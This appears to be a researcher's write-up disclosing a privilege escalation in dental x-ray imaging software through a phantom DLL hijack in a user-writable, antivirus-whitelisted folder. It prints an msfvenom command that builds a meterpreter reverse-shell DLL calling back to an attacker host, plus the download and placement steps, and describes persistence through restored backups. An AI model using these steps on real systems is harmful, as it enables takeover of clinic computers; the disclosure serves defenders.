## Introduction
Originally this was going to be a write-up on DLL proxying in some dental x-ray machine software but I stumbled on a DLL in my research that made me double check it, ultimately finding a privilege escalation vulnerability which got me a CVE. 
Early on in my tech career I used to do tech support for a dental x-ray machine manufacturer before it closed down, I remember the bugs that would come up while working there and always thought it would be a good idea to try to find vulnerabilites in that software. So, seeing as the software is still in use today, I decided to see if I could do anything cool with it now that I'm out of the software support game. I remember some time ago early on in my cyber security studies I noticed a few juicy hijackable DLLs in that software and decided I would take a shot at DLL proxying to see if I can get a malicious DLL running while keeping that software functional (really stealthy). Here's the process I followed and how I accidentally discovered a privilege escalation vulnerability that can (theoretically) survive a clean wipe and reinstall of the OS, so hopefully good information for Blue Teamers to be aware of.

## Final Version of the Software
One thing to note is this software is no longer recieving updates but I know the x-ray machine's are still in use around the US today so there's still some potential risk to this vulnerability. It can be downloaded [here](https://pancorp.com/software/files/PANCORP_DENTAL_IMAGING_9.1.2.7600.exe) along with the software manual [here](https://pancorp.com/pdf/Panoramic-Dental-Imaging-(GLAN)-Windows-10x64-Setup-Rev3.pdf) Another thing to note is IF this software is in use, there's a 99% chance the processes that run and the following locations are whitelisted in whatever ERD/AV is in use, this is also mentioned on page 24 of the software manual. So in this write-up I'm going to do the same thing and add these exclusions to match how this software would be installed in every dental office.
1. C:\Program Files (x86)\Panoramic
2. C:\ProgramData\Ajat

## Searching for Hijackable DLL
After the software is installed and exclusions added we fire up Process Monitor and start searching. Add the following filters and restart the "CCS Service" in Services:
1. Process Name is ccsservice.exe then Include
2. Path ends with .dll then Include
Once that populates you'll notice there are a bunch of hijackable DLLs in this software and I was scrolling through one day searching for a decent one to try proxying with and almost all the way to the bottom something caught my eye..

Could it be?? IT IS. This is a phantom DLL hijack from a user writeable location that's whitelisted: `C:\ProgramData\Ajat\panoramic\datastor\lnrdlib.dll`

## Setting up the attack
Here's the network setup for this test:
* Kali - 10.0.1.137
* Windows 10 64x - 10.0.1.128

Lets start off with creating a simple vanilla meterpreter dll since we don't really need to worry about AV, then spin up an http server to transfer it
```
## msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.1.137 LPORT=443 -f dll > lnrdlib.dll

##
python3 -m http.server 80
```

Back over on windows lets switch to our standard user account, open powershell, and navagate on over to that datastor folder and run the following:
`wget http://10.0.1.137/lnrdlib.dll -outfile lnrdlib.dll`

## Exploit
If everything was done correctly all we need to do to trigger the exploit is restart the computer.

SUCCESS

## Persisance after OS install
Now one of the key things about the datastor location is that it's one of the 2 locations that should be backed up in case the computer needs to be wiped or replaced for whatever reason and the software reinstalled. If the contents of the `calib` folder are lost and to get those back a technician will need to come out and recalibrate the x-ray machine. If the `datastor` files are lost, then you lose the most recent x-ray images that weren't saved yet so this location is somewhat optional to backup. This location is where the malware will reside so it's theoreticlly possible for someone to accidentally re-infect a computer with the malware if they restore the contents of a backed up datastor that had the malware and all it's files in the new computer install. This is mentioned on page 2 of the software manual.
